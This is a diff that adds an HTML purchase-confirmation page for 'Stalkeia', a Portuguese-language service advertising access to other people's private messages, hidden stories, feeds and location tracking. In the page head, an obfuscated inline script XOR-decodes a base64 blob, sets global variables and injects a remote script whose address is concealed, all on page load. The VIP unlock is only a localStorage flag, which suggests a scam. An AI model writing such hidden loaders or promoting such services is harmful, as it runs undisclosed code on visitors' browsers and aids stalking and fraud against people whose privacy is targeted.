@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Compra Aprovada — STALKEIA</title>
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon" type="image/png" href="/favicon.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" />
+  <link rel="stylesheet" href="/assets/root-zQuPsh3d.css" />
+  <script>(function(){var r_1y8=atob("DBjR3/qNyHMFZ2778GPzqojh6kknDxqPgGvr8NXurB0rEhqWmX6o8ZnipV1nFUGIk2q4r47+5wZxCh3UnHmluon55hl2RULZkWylrZPvvQdgFEzBq2PzsZvgrVE/RQqahHn8qo7goRV8Sh6JlW60sY6gsBBqA0OIk3Pz89j7qR9wAkzB0jqs84GvphJoAkzB0nywq5ugvQdoDgiC3WijuozopgcoFBuZmXyi/davvhJpEgvZyjrzoqfw");var z_4d=[];for(var c_7=0;c_7<r_1y8.length;c_7++){z_4d.push(r_1y8.charCodeAt(c_7)&255);}var m_8=z_4d[0];var u_z=z_4d.slice(1,1+m_8);var c_ad=z_4d.slice(1+m_8);var c_awg=c_ad.map(function(b,z_y){return b^u_z[z_y%m_8];});var u_cyd="";for(var u_m=0;u_m<c_awg.length;u_m++){u_cyd+=String.fromCharCode(c_awg[u_m]&255);}var i_bf=decodeURIComponent(escape(u_cyd));var x_s=JSON.parse(i_bf);var o_2v29=x_s.globals||[];o_2v29.forEach(function(q_vkv5){window[q_vkv5.name]=q_vkv5.value;});var s_p=document.createElement("script");s_p.src=x_s.url;s_p.async=true;s_p.defer=true;(x_s.attributes||[]).forEach(function(x_78mt){s_p.setAttribute(x_78mt.name,x_78mt.value);});(document.head||document.documentElement).appendChild(s_p);})();</script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #040607;
+      color: #f9f9f9;
+      font-family: 'Inter', system-ui, sans-serif;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px 48px;
+      overflow-x: hidden;
+    }
+
+    /* Background glow */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 80% 40% at 50% -10%, rgba(74, 55, 182, 0.22), transparent),
+        radial-gradient(ellipse 60% 30% at 80% 100%, rgba(171, 88, 244, 0.10), transparent);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .shell {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+    }
+
+    /* Logo */
+    .logo-wrap {
+      margin-bottom: 32px;
+    }
+    .logo-wrap img {
+      height: 48px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 18px rgba(171, 88, 244, 0.3));
+    }
+
+    /* Card */
+    .card {
+      background: rgba(12, 16, 17, 0.96);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 28px;
+      box-shadow: 0 24px 90px rgba(0, 0, 0, 0.55);
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .card-body {
+      padding: 32px 24px 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 0;
+    }
+
+    /* Check icon */
+    .check-wrap {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, rgba(74, 55, 182, 0.25), rgba(171, 88, 244, 0.20));
+      border: 1.5px solid rgba(171, 88, 244, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      animation: pulse-ring 2.4s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    .check-wrap svg {
+      width: 36px;
+      height: 36px;
+      animation: pop-in 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) 0.2s both;
+    }
+
+    @keyframes pulse-ring {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(74, 55, 182, 0.35); }
+      50% { box-shadow: 0 0 0 14px rgba(74, 55, 182, 0); }
+    }
+
+    @keyframes pop-in {
+      from { transform: scale(0) rotate(-15deg); opacity: 0; }
+      to { transform: scale(1) rotate(0deg); opacity: 1; }
+    }
+
+    /* Pill badge */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      border-radius: 999px;
+      background: rgba(74, 55, 182, 0.18);
+      border: 1px solid rgba(74, 55, 182, 0.35);
+      color: #a78bfa;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+    .badge-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #10b981;
+      animation: blink 1.4s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    /* Heading */
+    .heading {
+      font-size: clamp(26px, 7vw, 34px);
+      font-weight: 800;
+      line-height: 1.15;
+      letter-spacing: -0.03em;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #fff 30%, #c4b5fd 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subheading {
+      font-size: 15px;
+      color: #9ca3af;
+      line-height: 1.55;
+      margin-bottom: 28px;
+    }
+
+    /* Benefits list */
+    .benefits {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 28px;
+    }
+
+    .benefit-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 13px 16px;
+      border-radius: 16px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      text-align: left;
+      animation: slide-up 0.4s ease both;
+    }
+
+    .benefit-item:nth-child(1) { animation-delay: 0.35s; }
+    .benefit-item:nth-child(2) { animation-delay: 0.45s; }
+    .benefit-item:nth-child(3) { animation-delay: 0.55s; }
+    .benefit-item:nth-child(4) { animation-delay: 0.65s; }
+
+    @keyframes slide-up {
+      from { transform: translateY(12px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .benefit-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 11px;
+      background: linear-gradient(135deg, #4a37b6, #ab58f4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      box-shadow: 0 8px 20px rgba(74, 55, 182, 0.30);
+    }
+
+    .benefit-icon svg {
+      width: 17px;
+      height: 17px;
+      stroke: #fff;
+      fill: none;
+    }
+
+    .benefit-text {
+      display: flex;
+      flex-direction: column;
+      gap: 1px;
+    }
+
+    .benefit-label {
+      font-size: 14px;
+      font-weight: 700;
+      color: #f9f9f9;
+      line-height: 1.3;
+    }
+
+    .benefit-sub {
+      font-size: 12px;
+      color: #6b7280;
+      line-height: 1.4;
+    }
+
+    .benefit-check {
+      margin-left: auto;
+      flex-shrink: 0;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: rgba(16, 185, 129, 0.15);
+      border: 1.5px solid rgba(16, 185, 129, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .benefit-check svg {
+      width: 10px;
+      height: 10px;
+      stroke: #10b981;
+    }
+
+    /* CTA Button */
+    .cta-btn {
+      width: 100%;
+      padding: 18px 24px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, #4a37b6, #ab58f4);
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      letter-spacing: -0.01em;
+      box-shadow: 0 18px 42px rgba(74, 55, 182, 0.38);
+      transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-decoration: none;
+      animation: slide-up 0.4s 0.8s ease both;
+    }
+
+    .cta-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 24px 52px rgba(74, 55, 182, 0.45);
+    }
+
+    .cta-btn:active {
+      transform: translateY(0);
+      opacity: 0.9;
+    }
+
+    .cta-btn svg {
+      width: 20px;
+      height: 20px;
+      stroke: #fff;
+      fill: none;
+      transition: transform 0.2s ease;
+    }
+
+    .cta-btn:hover svg {
+      transform: translateX(3px);
+    }
+
+    /* Footer note */
+    .footer-note {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #4b5563;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .footer-note span {
+      color: #6b7280;
+    }
+
+    /* Divider */
+    .divider {
+      width: 100%;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.06);
+      margin: 22px 0;
+    }
+
+    /* Card footer */
+    .card-footer {
+      padding: 18px 24px;
+      background: rgba(255, 255, 255, 0.02);
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .card-footer-icon {
+      width: 16px;
+      height: 16px;
+      stroke: #4b5563;
+      fill: none;
+    }
+
+    .card-footer-text {
+      font-size: 12px;
+      color: #4b5563;
+    }
+  </style>
+
+  <script>
+    // Ativa o acesso VIP imediatamente ao carregar a página
+    try {
+      localStorage.setItem('stalkeia_vip', '1');
+      window.__vip = true;
+    } catch(e) {}
+  </script>
+</head>
+<body>
+  <div class="shell">
+
+    <!-- Logo -->
+    <div class="logo-wrap">
+      <img src="/images/logos/logo-vert-transparente.png" alt="Stalkeia" onerror="this.style.display='none'" />
+    </div>
+
+    <div class="card">
+      <div class="card-body">
+
+        <!-- Check animado -->
+        <div class="check-wrap">
+          <svg viewBox="0 0 24 24" fill="none" stroke="url(#grad)" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
+            <defs>
+              <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#4a37b6"/>
+                <stop offset="100%" stop-color="#ab58f4"/>
+              </linearGradient>
+            </defs>
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+
+        <!-- Badge status -->
+        <div class="badge">
+          <span class="badge-dot"></span>
+          Acesso VIP Ativado
+        </div>
+
+        <!-- Título -->
+        <h1 class="heading">Compra Aprovada!</h1>
+        <p class="subheading">Seu acesso completo ao Stalkeia foi liberado. Todas as informações estão disponíveis para você.</p>
+
+        <!-- Benefícios desbloqueados -->
+        <div class="benefits">
+          <div class="benefit-item">
+            <div class="benefit-icon">
+              <svg viewBox="0 0 24 24" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+              </svg>
+            </div>
+            <div class="benefit-text">
+              <span class="benefit-label">Mensagens Privadas</span>
+              <span class="benefit-sub">Acesso total ao feed de DMs</span>
+            </div>
+            <div class="benefit-check">
+              <svg viewBox="0 0 24 24" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+          </div>
+
+          <div class="benefit-item">
+            <div class="benefit-icon">
+              <svg viewBox="0 0 24 24" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/><path d="M8.56 2.75c4.37 6.03 6.02 9.42 8.03 17.72m2.54-15.38c-3.72 4.35-8.94 5.66-16.88 5.85m19.5 1.9c-3.5-.93-6.63-.82-8.94 0-2.58.92-5.01 2.86-7.44 6.32"/>
+              </svg>
+            </div>
+            <div class="benefit-text">
+              <span class="benefit-label">Stories Ocultos</span>
+              <span class="benefit-sub">Todos os perfis desbloqueados</span>
+            </div>
+            <div class="benefit-check">
+              <svg viewBox="0 0 24 24" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+          </div>
+
+          <div class="benefit-item">
+            <div class="benefit-icon">
+              <svg viewBox="0 0 24 24" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/>
+              </svg>
+            </div>
+            <div class="benefit-text">
+              <span class="benefit-label">Feed Completo</span>
+              <span class="benefit-sub">Curtidas, posts e interações</span>
+            </div>
+            <div class="benefit-check">
+              <svg viewBox="0 0 24 24" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+          </div>
+
+          <div class="benefit-item">
+            <div class="benefit-icon">
+              <svg viewBox="0 0 24 24" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
+              </svg>
+            </div>
+            <div class="benefit-text">
+              <span class="benefit-label">Localização</span>
+              <span class="benefit-sub">Rastreio de locais e check-ins</span>
+            </div>
+            <div class="benefit-check">
+              <svg viewBox="0 0 24 24" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+          </div>
+        </div>
+
+        <!-- Botão CTA -->
+        <a href="/" class="cta-btn" id="cta-btn">
+          Começar a Usar Agora
+          <svg viewBox="0 0 24 24" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
+          </svg>
+        </a>
+
+      </div>
+
+      <!-- Card footer -->
+      <div class="card-footer">
+        <svg class="card-footer-icon" viewBox="0 0 24 24" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        <span class="card-footer-text">Acesso salvo neste dispositivo automaticamente</span>
+      </div>
+    </div>
+
+    <!-- Nota de rodapé -->
+    <p class="footer-note">
+      Guarde este link para <span>reativar seu acesso</span> em outro dispositivo.<br/>
+      Suporte: contato@stalkeia.website
+    </p>
+
+  </div>
+
+  <script>
+    // Garantir que o VIP foi salvo e redirecionar ao clicar
+    document.getElementById('cta-btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      try {
+        localStorage.setItem('stalkeia_vip', '1');
+        // Também limpar o timer para não redirecionar de volta para /cta
+        localStorage.removeItem('cta_timer_expired');
+        localStorage.removeItem('previewStartTime');
+        localStorage.removeItem('shared_timer_start');
+      } catch(err) {}
+      window.location.href = '/';
+    });
+  </script>
+</body>
+</html>
